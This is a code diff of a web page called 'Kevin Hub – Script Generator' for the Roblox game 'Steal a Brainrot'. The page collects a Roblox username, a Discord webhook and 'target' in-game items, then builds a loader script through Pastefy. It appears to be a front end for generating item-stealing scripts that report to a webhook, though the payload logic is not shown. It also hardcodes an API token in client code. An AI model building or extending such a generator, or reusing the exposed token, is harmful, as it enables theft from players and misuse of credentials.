@@ -20,49 +20,16 @@
       --muted: #7a7a85;
       --card-radius: 20px;
     }
-
     * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-
-    @keyframes float {
-      0%, 100% { transform: translateY(0px); }
-      50% { transform: translateY(-8px); }
-    }
-
-    @keyframes glowPulse {
-      0%, 100% { box-shadow: 0 0 20px var(--primary-glow), 0 0 40px transparent; }
-      50% { box-shadow: 0 0 30px var(--primary-glow), 0 0 60px rgba(255, 77, 77, 0.15); }
-    }
-
-    @keyframes slideUp {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    @keyframes shimmer {
-      0% { background-position: -200% 0; }
-      100% { background-position: 200% 0; }
-    }
-
-    @keyframes dotBounce {
-      0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
-      40% { transform: scale(1); opacity: 1; }
-    }
-
+    @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+    @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-8px); } }
+    @keyframes glowPulse { 0%, 100% { box-shadow: 0 0 20px var(--primary-glow), 0 0 40px transparent; } 50% { box-shadow: 0 0 30px var(--primary-glow), 0 0 60px rgba(255, 77, 77, 0.15); } }
+    @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
+    @keyframes dotBounce { 0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; } 40% { transform: scale(1); opacity: 1; } }
+    @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-4px); } 75% { transform: translateX(4px); } }
     body {
       background: var(--bg);
       font-family: 'Inter', system-ui, -apple-system, sans-serif;
@@ -72,8 +39,6 @@
       overflow-x: hidden;
       position: relative;
     }
-
-    /* Animated background mesh */
     body::before {
       content: '';
       position: fixed;
@@ -86,8 +51,6 @@
       animation: gradientShift 18s ease infinite;
       background-size: 200% 200%;
     }
-
-    /* Grid overlay */
     body::after {
       content: '';
       position: fixed;
@@ -100,21 +63,8 @@
       pointer-events: none;
       mask-image: radial-gradient(ellipse at center, black 30%, transparent 80%);
     }
-
-    .page {
-      max-width: 1200px;
-      margin: 0 auto;
-      padding: 3rem 1.5rem 2rem;
-      animation: fadeIn 0.8s ease;
-    }
-
-    /* HEADER */
-    header {
-      text-align: center;
-      margin-bottom: 2.5rem;
-      animation: slideUp 0.8s ease;
-    }
-
+    .page { max-width: 1200px; margin: 0 auto; padding: 3rem 1.5rem 2rem; animation: fadeIn 0.8s ease; }
+    header { text-align: center; margin-bottom: 2.5rem; animation: slideUp 0.8s ease; }
     .logo-badge {
       display: inline-flex;
       align-items: center;
@@ -130,16 +80,12 @@
       font-weight: 600;
       margin-bottom: 1rem;
     }
-
     .logo-badge .dot {
-      width: 6px;
-      height: 6px;
-      border-radius: 50%;
+      width: 6px; height: 6px; border-radius: 50%;
       background: var(--primary);
       box-shadow: 0 0 8px var(--primary);
       animation: glowPulse 2s ease infinite;
     }
-
     h1 {
       font-family: 'Space Grotesk', sans-serif;
       font-size: clamp(2.8rem, 8vw, 5rem);
@@ -154,7 +100,6 @@
       text-shadow: 0 0 60px rgba(255, 77, 77, 0.25);
       line-height: 1.1;
     }
-
     .subtitle {
       margin-top: 0.6rem;
       font-size: 0.75rem;
@@ -163,15 +108,7 @@
       color: var(--muted);
       font-weight: 500;
     }
-
-    /* TABS */
-    .tabs-wrap {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 2.5rem;
-      animation: slideUp 0.8s ease 0.1s both;
-    }
-
+    .tabs-wrap { display: flex; justify-content: center; margin-bottom: 2.5rem; animation: slideUp 0.8s ease 0.1s both; }
     .tabs {
       display: inline-flex;
       padding: 5px;
@@ -179,9 +116,7 @@
       background: var(--surface);
       border: 1px solid var(--border);
       backdrop-filter: blur(12px);
-      position: relative;
     }
-
     .tab {
       position: relative;
       padding: 0.6rem 1.5rem;
@@ -193,13 +128,8 @@
       color: var(--muted);
       cursor: pointer;
       transition: color 0.3s ease;
-      z-index: 1;
     }
-
-    .tab.active {
-      color: #fff;
-    }
-
+    .tab.active { color: #fff; }
     .tab.active::before {
       content: '';
       position: absolute;
@@ -208,22 +138,14 @@
       background: linear-gradient(135deg, var(--primary), var(--accent));
       z-index: -1;
       box-shadow: 0 4px 20px var(--primary-glow);
-      animation: fadeIn 0.3s ease;
     }
-
-    /* GRID */
     .grid {
       display: grid;
       grid-template-columns: 1fr 420px;
       gap: 1.5rem;
       align-items: start;
     }
-
-    @media (max-width: 960px) {
-      .grid { grid-template-columns: 1fr; }
-    }
-
-    /* CARDS */
+    @media (max-width: 960px) { .grid { grid-template-columns: 1fr; } }
     .card {
       background: var(--surface);
       border: 1px solid var(--border);
@@ -234,49 +156,21 @@
       position: relative;
       overflow: hidden;
       animation: slideUp 0.8s ease 0.2s both;
-      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+      transition: border-color 0.3s ease;
     }
-
     .card::before {
       content: '';
       position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
+      top: 0; left: 0; right: 0;
       height: 1px;
       background: linear-gradient(90deg, transparent, rgba(255, 77, 77, 0.5), transparent);
       opacity: 0.6;
     }
-
-    .card:hover {
-      border-color: rgba(255, 77, 77, 0.2);
-    }
-
-    .card-form {
-      display: flex;
-      flex-direction: column;
-      gap: 1.5rem;
-    }
-
-    .card-output {
-      position: sticky;
-      top: 1.5rem;
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-    }
-
-    @media (max-width: 960px) {
-      .card-output { position: static; }
-    }
-
-    /* FIELD */
-    .field {
-      display: flex;
-      flex-direction: column;
-      gap: 0.5rem;
-    }
-
+    .card:hover { border-color: rgba(255, 77, 77, 0.2); }
+    .card-form { display: flex; flex-direction: column; gap: 1.5rem; }
+    .card-output { position: sticky; top: 1.5rem; display: flex; flex-direction: column; gap: 1rem; }
+    @media (max-width: 960px) { .card-output { position: static; } }
+    .field { display: flex; flex-direction: column; gap: 0.5rem; }
     .label {
       font-size: 0.7rem;
       font-weight: 600;
@@ -288,12 +182,7 @@
       justify-content: space-between;
       gap: 0.5rem;
     }
-
-    .label .actions {
-      display: flex;
-      gap: 0.9rem;
-    }
-
+    .label .actions { display: flex; gap: 0.9rem; }
     .label .actions button {
       background: none;
       border: none;
@@ -305,11 +194,7 @@
       padding: 0;
       transition: color 0.2s ease;
     }
-
-    .label .actions button:hover {
-      color: var(--primary);
-    }
-
+    .label .actions button:hover { color: var(--primary); }
     input[type="text"] {
       width: 100%;
       padding: 0.85rem 1rem;
@@ -322,29 +207,22 @@
       outline: none;
       transition: all 0.25s ease;
     }
-
-    input[type="text"].mono {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.82rem;
-    }
-
-    input[type="text"]::placeholder {
-      color: #4a4a52;
-    }
-
+    input[type="text"].mono { font-family: 'JetBrains Mono', monospace; font-size: 0.82rem; }
+    input[type="text"]::placeholder { color: #4a4a52; }
     input[type="text"]:focus {
       border-color: var(--primary);
       box-shadow: 0 0 0 3px rgba(255, 77, 77, 0.12), 0 0 20px rgba(255, 77, 77, 0.15);
       background: rgba(0, 0, 0, 0.6);
     }
-
-    /* PILLS */
-    .pills {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.5rem;
+    input[type="text"].invalid {
+      border-color: #ff3b3b;
+      animation: shake 0.4s ease;
     }
-
+    .search-input { padding: 0.65rem 0.9rem !important; font-size: 0.82rem !important; }
+    .pills { display: flex; flex-wrap: wrap; gap: 0.5rem; max-height: 180px; overflow-y: auto; padding-right: 4px; }
+    .pills::-webkit-scrollbar { width: 4px; }
+    .pills::-webkit-scrollbar-track { background: transparent; }
+    .pills::-webkit-scrollbar-thumb { background: rgba(255,77,77,0.3); border-radius: 4px; }
     .pill {
       padding: 0.45rem 0.9rem;
       font-size: 0.75rem;
@@ -355,29 +233,20 @@
       color: var(--muted);
       cursor: pointer;
       transition: all 0.2s ease;
-      position: relative;
       animation: fadeIn 0.3s ease;
     }
-
     .pill:hover {
       border-color: var(--border-hover);
       color: var(--text);
       transform: translateY(-1px);
     }
-
     .pill.selected {
       border-color: var(--primary);
       background: rgba(255, 77, 77, 0.12);
       color: var(--primary);
       box-shadow: 0 0 12px rgba(255, 77, 77, 0.2);
     }
-
-    .pill.selected::after {
-      content: '✓';
-      margin-left: 0.35rem;
-      font-weight: 700;
-    }
-
+    .pill.selected::after { content: '✓'; margin-left: 0.35rem; font-weight: 700; }
     .count {
       font-size: 0.65rem;
       letter-spacing: 0.18em;
@@ -385,12 +254,7 @@
       text-transform: uppercase;
       font-weight: 600;
     }
-
-    .count strong {
-      color: var(--primary);
-    }
-
-    /* CHECKBOX */
+    .count strong { color: var(--primary); }
     .checkbox-row {
       display: flex;
       align-items: center;
@@ -403,67 +267,38 @@
       transition: all 0.2s ease;
       background: rgba(0, 0, 0, 0.25);
     }
-
-    .checkbox-row:hover {
-      border-color: rgba(255, 255, 255, 0.12);
-      background: rgba(0, 0, 0, 0.35);
-    }
-
-    .checkbox-row .info .name {
-      font-size: 0.88rem;
-      font-weight: 600;
-      color: var(--text);
-    }
-
-    .checkbox-row .info .desc {
-      font-size: 0.75rem;
-      color: var(--muted);
-      margin-top: 0.15rem;
-    }
-
+    .checkbox-row:hover { border-color: rgba(255, 255, 255, 0.12); background: rgba(0, 0, 0, 0.35); }
+    .checkbox-row .info .name { font-size: 0.88rem; font-weight: 600; color: var(--text); }
+    .checkbox-row .info .desc { font-size: 0.75rem; color: var(--muted); margin-top: 0.15rem; }
     .toggle {
       position: relative;
-      width: 42px;
-      height: 24px;
+      width: 42px; height: 24px;
       border-radius: 999px;
       background: rgba(255, 255, 255, 0.1);
       transition: background 0.25s ease;
       flex-shrink: 0;
     }
-
     .toggle::after {
       content: '';
       position: absolute;
-      top: 3px;
-      left: 3px;
-      width: 18px;
-      height: 18px;
+      top: 3px; left: 3px;
+      width: 18px; height: 18px;
       border-radius: 50%;
       background: #fff;
       transition: transform 0.25s ease;
     }
-
-    input[type="checkbox"] {
-      display: none;
-    }
-
+    input[type="checkbox"] { display: none; }
     input[type="checkbox"]:checked + .toggle {
       background: linear-gradient(135deg, var(--primary), var(--accent));
       box-shadow: 0 0 12px var(--primary-glow);
     }
-
-    input[type="checkbox"]:checked + .toggle::after {
-      transform: translateX(18px);
-    }
-
-    /* OUTPUT CARD */
+    input[type="checkbox"]:checked + .toggle::after { transform: translateX(18px); }
     .output-header {
       display: flex;
       align-items: center;
       justify-content: space-between;
       gap: 1rem;
     }
-
     .output-title {
       display: flex;
       align-items: center;
@@ -472,12 +307,7 @@
       font-weight: 600;
       font-size: 1rem;
     }
-
-    .output-title .sparkle {
-      color: var(--primary);
-      animation: float 3s ease infinite;
-    }
-
+    .output-title .sparkle { color: var(--primary); animation: float 3s ease infinite; }
     .copy-btn {
       display: inline-flex;
       align-items: center;
@@ -494,16 +324,7 @@
       transition: all 0.2s ease;
       box-shadow: 0 2px 12px var(--primary-glow);
     }
-
-    .copy-btn:hover {
-      transform: translateY(-1px);
-      box-shadow: 0 4px 18px var(--primary-glow);
-    }
-
-    .copy-btn:active {
-      transform: translateY(0);
-    }
-
+    .copy-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 18px var(--primary-glow); }
     .output-box {
       min-height: 200px;
       max-height: 50vh;
@@ -520,41 +341,22 @@
       word-break: break-all;
       transition: border-color 0.3s ease;
     }
-
     .output-box.loading {
       display: flex;
       align-items: center;
       justify-content: center;
       color: var(--muted);
     }
-
-    .output-box .dots {
-      display: inline-flex;
-      gap: 4px;
-      margin-left: 6px;
-    }
-
+    .output-box .dots { display: inline-flex; gap: 4px; margin-left: 6px; }
     .output-box .dots span {
-      width: 6px;
-      height: 6px;
-      border-radius: 50%;
+      width: 6px; height: 6px; border-radius: 50%;
       background: var(--primary);
       animation: dotBounce 1.4s ease infinite;
     }
-
     .output-box .dots span:nth-child(2) { animation-delay: 0.2s; }
     .output-box .dots span:nth-child(3) { animation-delay: 0.4s; }
-
-    .output-box.success {
-      border-color: rgba(77, 255, 154, 0.3);
-    }
-
-    .output-box.error {
-      border-color: rgba(255, 77, 77, 0.4);
-      color: #ff8a8a;
-    }
-
-    /* GENERATE BUTTON */
+    .output-box.success { border-color: rgba(77, 255, 154, 0.3); }
+    .output-box.error { border-color: rgba(255, 77, 77, 0.4); color: #ff8a8a; }
     .generate-btn {
       width: 100%;
       padding: 1.05rem;
@@ -572,37 +374,20 @@
       box-shadow: 0 8px 30px rgba(255, 77, 77, 0.3);
       transition: all 0.25s ease;
     }
-
     .generate-btn::before {
       content: '';
       position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
+      top: 0; left: -100%;
+      width: 100%; height: 100%;
       background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
       animation: shimmer 2.5s ease infinite;
     }
-
-    .generate-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 40px rgba(255, 77, 77, 0.45);
-    }
-
-    .generate-btn:active {
-      transform: translateY(0);
-    }
-
-    .generate-btn:disabled {
-      cursor: not-allowed;
-      opacity: 0.7;
-      transform: none;
-    }
-
+    .generate-btn:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(255, 77, 77, 0.45); }
+    .generate-btn:active { transform: translateY(0); }
+    .generate-btn:disabled { cursor: not-allowed; opacity: 0.7; transform: none; }
     .generate-btn .spinner {
       display: inline-block;
-      width: 14px;
-      height: 14px;
+      width: 14px; height: 14px;
       border: 2px solid rgba(255,255,255,0.35);
       border-top-color: #fff;
       border-radius: 50%;
@@ -610,20 +395,13 @@
       margin-right: 0.5rem;
       vertical-align: middle;
     }
-
     .hint {
       font-size: 0.7rem;
       text-align: center;
       color: var(--muted);
       letter-spacing: 0.05em;
     }
-
-    .hint .key {
-      color: var(--primary);
-      font-weight: 600;
-    }
-
-    /* FOOTER */
+    .hint .key { color: var(--primary); font-weight: 600; }
     footer {
       margin-top: 4rem;
       text-align: center;
@@ -631,13 +409,7 @@
       color: var(--muted);
       padding-bottom: 2rem;
     }
-
-    footer .sep {
-      color: var(--primary);
-      margin: 0 0.4rem;
-    }
-
-    /* TOAST */
+    footer .sep { color: var(--primary); margin: 0 0.4rem; }
     .toast {
       position: fixed;
       bottom: 2rem;
@@ -657,68 +429,47 @@
       align-items: center;
       gap: 0.5rem;
     }
-
-    .toast.show {
-      transform: translateX(-50%) translateY(0);
-    }
-
-    .toast .icon {
-      color: var(--primary);
-    }
-
-    /* Search input smaller */
-    .search-input {
-      padding: 0.65rem 0.9rem !important;
-      font-size: 0.82rem !important;
-    }
+    .toast.show { transform: translateX(-50%) translateY(0); }
+    .toast .icon { color: var(--primary); }
   </style>
 </head>
 <body>
   <div class="page">
     <header>
-      <div class="logo-badge">
-        <span class="dot"></span>
-        Powered by Pastefy
-      </div>
+      <div class="logo-badge"><span class="dot"></span>Powered by Pastefy</div>
       <h1>Kevin Hub</h1>
       <p class="subtitle">Script Generator</p>
     </header>
-
     <div class="tabs-wrap">
       <div class="tabs">
         <button class="tab active" data-game="steal-brainrot">Steal a Brainrot</button>
       </div>
     </div>
-
     <div class="grid">
-      <!-- FORM CARD -->
       <div class="card card-form">
         <div class="field">
           <label class="label">Roblox Username</label>
           <input type="text" id="usernameInput" placeholder="Your username" value="">
         </div>
-
         <div class="field">
           <label class="label">Discord Webhook</label>
           <input type="text" class="mono" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." value="">
         </div>
-
         <div class="field">
           <div class="label">
-            Target Pets
+            Target Brainrots
             <div class="actions">
-              <button data-select-all="pets">ALL</button>
-              <button data-select-none="pets">NONE</button>
+              <button data-select-all="brainrots">ALL</button>
+              <button data-select-none="brainrots">NONE</button>
             </div>
           </div>
-          <input type="text" class="search-input" id="petSearch" placeholder="Search pets...">
-          <div class="pills" id="petsContainer"></div>
-          <div class="count"><strong id="petsSelectedCount">0</strong> SELECTED</div>
+          <input type="text" class="search-input" id="brainrotSearch" placeholder="Search brainrots...">
+          <div class="pills" id="brainrotsContainer"></div>
+          <div class="count"><strong id="brainrotsSelectedCount">0</strong> SELECTED</div>
         </div>
-
         <div class="field">
           <div class="label">
-            Target Skins
+            Target Base Skins
             <div class="actions">
               <button data-select-all="skins">ALL</button>
               <button data-select-none="skins">NONE</button>
@@ -727,7 +478,6 @@
           <div class="pills" id="skinsContainer"></div>
           <div class="count"><strong id="skinsSelectedCount">0</strong> SELECTED</div>
         </div>
-
         <div class="field">
           <div class="label">
             Target Gears
@@ -739,7 +489,6 @@
           <div class="pills" id="gearsContainer"></div>
           <div class="count"><strong id="gearsSelectedCount">0</strong> SELECTED</div>
         </div>
-
         <div class="field">
           <label class="label">Options</label>
           <label class="checkbox-row">
@@ -752,58 +501,45 @@
           </label>
         </div>
       </div>
-
-      <!-- OUTPUT CARD -->
       <div class="card card-output">
         <div class="output-header">
-          <div class="output-title">
-            <span class="sparkle">✦</span>
-            Generated Script
-          </div>
+          <div class="output-title"><span class="sparkle">✦</span>Generated Script</div>
           <button class="copy-btn" id="copyBtn">
             <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
             Copy
           </button>
         </div>
-
         <div class="output-box" id="scriptOutput">Fill in the form and press GENERATE SCRIPT to build your Kevin Hub loader.</div>
-
         <button class="generate-btn" id="generateBtn">Generate Script</button>
         <p class="hint">Real link generated on every click · <span class="key">Pastefy</span></p>
       </div>
     </div>
-
-    <footer>
-      © 2026 Kevin Hub <span class="sep">·</span> For educational purposes only
-    </footer>
+    <footer>© 2026 Kevin Hub <span class="sep">·</span> For educational purposes only</footer>
   </div>
-
-  <div class="toast" id="toast">
-    <span class="icon">✓</span>
-    <span id="toastText">Copied!</span>
-  </div>
+  <div class="toast" id="toast"><span class="icon">✓</span><span id="toastText">Copied!</span></div>
 
   <script>
     (function() {
       const PASTEFY_API_TOKEN = 'BIqBt1wWgJvXEG2er4A3UD6rxGZnXCllMJV5qvRO0hddGrgqbhluCHf0dhst';
 
-      const petsList = ["Common Pet","Rare Pet","Epic Pet","Legendary Pet","Mythic Pet","Secret Pet","Glitch Pet","Rainbow Pet","Golden Pet","Shiny Pet","Frost Pet","Inferno Pet","Shadow Pet","Galaxy Pet","Nebula Pet","Cyber Pet","Neon Pet","Crystal Pet","Phantom Pet","Royal Pet"];
-      const skinsList = ["Default","Halloween","Christmas","Easter","Summer","Lucky","Aquatic","Galaxy"];
-      const gearsList = ["Speed Coil","Gravity Coil","Trade Hammer","Lucky Charm","Auto Collector","Magnet","Radar","Shield"];
+      const brainrotsList = ["Garama and Madundung","Capitano Moby","Burguro And Fryuro","Ketchuru and Musturu","Lavadorito Spinito","Ketupat Kepat","Tictac Sahur","Tang Tang Keletang","Money Money Puggy","Nuclearo Dinossauro","Graipuss Medussi","Cerberus","Dragon Cannelloni","Agarrini la Palini","Fragola La La La","Los Hotspotsitos","Los Bros","Tralaledon","Los Puggies","Los Primos","Los Tacoritas","Los Spaghettis","Spooky and Pumpky","Fragrama and Chocrama","La Casa Boo","Ketupat Bros","Cooki and Milki","Popcuru and Fizzuru","La Supreme Combinasion","Dragon Gingerini","Headless Horseman","Hydra Dragon Cannelloni","Celularcini Viciosini","La Grande Combinasion","Los Trios","La Sahur Combinasion","Bacuru and Egguru","Eviledon","Orcaledon","Money Money Reindeer","Los Jolly Combinasionas","Jolly Jolly Sahur","Chicleteira Noelteira","Bisonte Giuppitere","Jackorilla","Reindeer Tralala","Pumpkini Spyderini","Frankentteo","Santteo","Telemorte","Spaghetti Tualetti","La Secret Combinasion","La Food Combinasion","Los Spooky Combinasionas","Karkerkar Kurkur","La Ginger Sekolah","Rosey and Teddy","Los Sekolahs","Reinito Sleighito","Swaggy Bros","La Taco Combinasion","Chipso and Queso","La Spooky Grande","Tuff Toucan","Chillin Chili","Gobblino Uniciclino","Strawberry Elephant","La Extinct Grande","Tacorita Bicicleta","Quesadillo Vampiro","Perrito Burrito","La Vacca Saturno Saturnita","Karker Sahur","Bunito Bunito Spinito","Pirulitoita Bicicleteira","Bunnyman","Brunito Marsito","Guest 666","Mariachi Corazoni","Swag Soda","Extinct Matteo","Los Quesadillas","Spinny Hammy","Meowl","Skibidi Toilet","Nacho Spyder","Griffin","W or L","La Jolly Grande","La Romantic Grande","Festive 67","Los Tralaleritos","Las Tralaleritas","GOAT","Love Love Bear","Ginger Gerat","Mieteteira Bicicleteira","Trenostruzzo Turbo 4000","La Karkerkar Combinasion","La Vacca Prese Presente","Rocco Disco","1x1x1x1","25","67","Abyssaloco","Antonio","Aquarino","Arcadopus","Arcadragon","Bananito","Baskito","Bearito Cabinito","Berryno","Blackhole Goat","Boatito Auratito","Bombardiro Vaccariro","Boppin Bunny","Buho de Volto","Bunny Bunny Bunny Sahur","Bunny and Eggy","Buntteo","Burrito Bandito","Camera Ramena","Capitano Gullini","Cash or Card","Caylusaurus","Celestial Pegasus","Chachechi","Chicleteira Bicicleteira","Chicleteira Cupideira","Chicleteira Surfeiteira","Chicleteirina Bicicleteirina","Chill Puppy","Chimnino","Churrito Bunnito","Cigno Fulgoro","Cloverat Clapat","Coco and Mango","Craburger","Cuadramat and Pakrahmatmamat","Cupid Cupid Sahur","Cupid Hotspot","DJ Panda","Digi Narwhal","Donkeyturbo Express","Dragon Aquanini","Dug dug dug","Duggy Bros","Dul Dul Dul","Easter Easter Easter Sahur","Eid Eid Eid Sahur","Elefanto Frigo","Esok Sekolah","Extinct Tralalero","Fishboard","Fishino Clownino","Flancito","Flipa Sandala","Fortunu and Cashuru","Foxini Lanternini","Frullato Framingo","Futbolini Skatini","Gelato Lumacho","Giftini Spyderini","Girafini Raftini","Glaciator","Globa Steppa","Gold Egg","Gold Elf","Gold Gold Gold","Granny","Guerriro Digitale","Gym Bros","Ho Ho Ho Sahur","Hopilikalika Hopilikalako","Horegini Boom","Hydra Bunny","Jelly Moby","Job Job Job Sahur","John Doe","Kalika Bros","Kraken","La Anniversary Grande","La Cucaracha","La Easter Grande","La Lucky Grande","La Summer Grande","La Vacca Jacko Linterino","La Vacca Lepre Lepreino","Las Sis","Las Vaquitas Saturnitas","List List List Sahur","Los 25","Los 67","Los Amigos","Los Bunitos","Los Burritos","Los Candies","Los Chicleteiras","Los Chillis","Los Combinasionas","Los Cucarachas","Los Cupids","Los Fruits","Los Hackers","Los Jobcitos","Los Karkeritos","Los Mariachis","Los Matteos","Los Mi Gatitos","Los Mobilis","Los Nooo My Hotspotsitos","Los Planitos","Los Spyderinis","Los Sweethearts","Los Tortus","Love Love Love Sahur","Lovin Rose","Luck Luck Luck Sahur","Lucky Block","Mi Gatito","Money Money Bros","Naughty Naughty","Noo my Candy","Noo my Eggs","Noo my Gold","Noo my Heart","Noo my Present","Noo my examine","Nooo My Hotspot","Octoball","Ombrello Topolino","Pancake and Syrup","Paradiso Axolottino","Please my Present","Pot Hotspot","Pot Pumpkin","Quackini Snackini","Quesadilla Crocodila","Rang Ring Bus","Rico Dinero","Rocketini Frostini","Rosetti Tualetti","Rubrikiko","Sammyni Cakini","Sammyni Fattini","Sammyni Spyderini","Sand Sand Sand","Santa Hotspot","Serafinna Medusella","Signore Carapace","Snailo Clovero","Steakini Fattini","Strawberrita","Sushi Inu","Tacorillo Crocodillo","Tirilikalika Tirilikalako","To To To Sahur","Torrtuginni Dragonfrutini","Trickolino","Triplito Tralaleritos","Ventoliero Pavonero","Venuspino","Vulturino Skeletono","Yess my examine","Zombie Tralala","Esok Goala","Ref Ref Ref Sahur","Hippo Golazo","Bufalino Boomberino","Capitano Americano","Var Var Var","Los Tictacs","Los Tangcitos","Los Admins","Moby Bros","Grabatron","Rubiko and Kubiko","Cangurato Gelato","Noodle Noodle Poodle","Toro Españolo","Chicleteira Champeona","Examen Bros","Pizza and Ranch","Los Secret Combinasionas","Bumbatron","Yetimatic","S'more Serat","Queen Bee","Scorpino Coasterino","Honey Honey Bear","Pogo Pogo Penguin","Conetto Morsetto","La Breakfast Combinasion","La Fuse Machine","Candini Fluffini","Polaroidini","Noo my Resume","Peschito Machito","4th Bros","Los Cornis","Gelatina Volatina","Los Sigmas","Yess my Resume","Nachorilla","Sammyni Truckini","Tacoturbo Tacorito","Burrito Bat","Pop Pop Petalini","Rosatops Triceratino","Motorino Bumbino","Syrup Samurai","Orchidox","Los Dragons","La Craft Machine","Gold and Diamond","Chicli Chicla","Panda Popanda","Deputy Leopard","John Pork","Zebrino Pianino","Ski Ski Skunki","Sir Mangus","Sammyni Spookyni","Rockarino Rockara","Capibaro Celestino","Draculino","Fangaro Lupino","Gattino Hydrantino","Gub","Honey Honey Narwhal","Hydra Serpent","Lavamanta","Lionello Casarello","Los Treaters","Marino Submarino","Oni Oni Panda","Pelican Pachetto","Phoenix","Pin Pin Pengu","Plant Bros","Puffino Builderino","Qamar Camelamp","Ranito Pepito","Rexino Ramino","Dragon Skeletonini","Cobra Gelato","Flying Dutchman","Slushki Huski","Boo Boo Rocket","Bat-in-the-Box","Bananito Skelito","Zombie Bowl","Grim Cheese"];
 
-      const selectedPets = new Set();
+      const skinsList = ["Rose","Gingerbread","Halloween","Christmas","Bunny Basket","Summer","Pot of Gold","Taco","Octo","Valentines","Easter","Lucky","Aquatic","Tralalero"];
+
+      const gearsList = ["Santa's Sleigh","Cupid's Wings","Witch's Broom","Waverider","Yin Yang Slap","Cursed Slap","Cyber Slap","Divine Slap","Bloodmoon Slap","Radioactive Slap","Rainbow Slap","Rainbow Hammer","Bloodmoon Hammer","Radioactive Airstrike","Yin Yang Lamp","Demon's Head","Lava Slap","Lava Blaster","Alien Slap","Blackhole Bomb","Candy Sentry","Phantom Slap","Crystal Slap"];
+
+      const selectedBrainrots = new Set();
       const selectedSkins = new Set();
       const selectedGears = new Set();
 
       const $ = (id) => document.getElementById(id);
-
-      const petsContainer = $('petsContainer');
+      const brainrotsContainer = $('brainrotsContainer');
       const skinsContainer = $('skinsContainer');
       const gearsContainer = $('gearsContainer');
-      const petsSelectedCount = $('petsSelectedCount');
+      const brainrotsSelectedCount = $('brainrotsSelectedCount');
       const skinsSelectedCount = $('skinsSelectedCount');
       const gearsSelectedCount = $('gearsSelectedCount');
-      const petSearch = $('petSearch');
+      const brainrotSearch = $('brainrotSearch');
       const scriptOutput = $('scriptOutput');
       const generateBtn = $('generateBtn');
       const copyBtn = $('copyBtn');
@@ -812,64 +548,66 @@
 
       function renderPills(container, items, selectedSet, type) {
         container.innerHTML = '';
-        const searchTerm = type === 'pets' ? (petSearch.value || '').toLowerCase() : '';
+        const searchTerm = type === 'brainrots' ? (brainrotSearch.value || '').toLowerCase() : '';
         items.forEach(item => {
-          if (type === 'pets' && searchTerm && !item.toLowerCase().includes(searchTerm)) return;
+          if (type === 'brainrots' && searchTerm && !item.toLowerCase().includes(searchTerm)) return;
           const btn = document.createElement('button');
           btn.className = 'pill' + (selectedSet.has(item) ? ' selected' : '');
           btn.textContent = item;
           btn.addEventListener('click', (e) => {
             e.preventDefault();
-            if (selectedSet.has(item)) {
-              selectedSet.delete(item);
-              btn.classList.remove('selected');
-            } else {
-              selectedSet.add(item);
-              btn.classList.add('selected');
-            }
+            if (selectedSet.has(item)) { selectedSet.delete(item); btn.classList.remove('selected'); }
+            else { selectedSet.add(item); btn.classList.add('selected'); }
             updateCounts();
           });
           container.appendChild(btn);
         });
       }
-
       function updateCounts() {
-        petsSelectedCount.textContent = selectedPets.size;
+        brainrotsSelectedCount.textContent = selectedBrainrots.size;
         skinsSelectedCount.textContent = selectedSkins.size;
         gearsSelectedCount.textContent = selectedGears.size;
       }
-
       function refreshAllPills() {
-        renderPills(petsContainer, petsList, selectedPets, 'pets');
+        renderPills(brainrotsContainer, brainrotsList, selectedBrainrots, 'brainrots');
         renderPills(skinsContainer, skinsList, selectedSkins, 'skins');
         renderPills(gearsContainer, gearsList, selectedGears, 'gears');
         updateCounts();
       }
-
       refreshAllPills();
-      petSearch.addEventListener('input', () => renderPills(petsContainer, petsList, selectedPets, 'pets'));
+      brainrotSearch.addEventListener('input', () => renderPills(brainrotsContainer, brainrotsList, selectedBrainrots, 'brainrots'));
 
       document.querySelectorAll('[data-select-all]').forEach(btn => {
         btn.addEventListener('click', (e) => {
           e.preventDefault();
           const type = btn.dataset.selectAll;
-          if (type === 'pets') petsList.forEach(i => selectedPets.add(i));
+          if (type === 'brainrots') brainrotsList.forEach(i => selectedBrainrots.add(i));
           else if (type === 'skins') skinsList.forEach(i => selectedSkins.add(i));
           else if (type === 'gears') gearsList.forEach(i => selectedGears.add(i));
           refreshAllPills();
         });
       });
-
       document.querySelectorAll('[data-select-none]').forEach(btn => {
         btn.addEventListener('click', (e) => {
           e.preventDefault();
           const type = btn.dataset.selectNone;
-          if (type === 'pets') selectedPets.clear();
+          if (type === 'brainrots') selectedBrainrots.clear();
           else if (type === 'skins') selectedSkins.clear();
           else if (type === 'gears') selectedGears.clear();
           refreshAllPills();
         });
       });
+
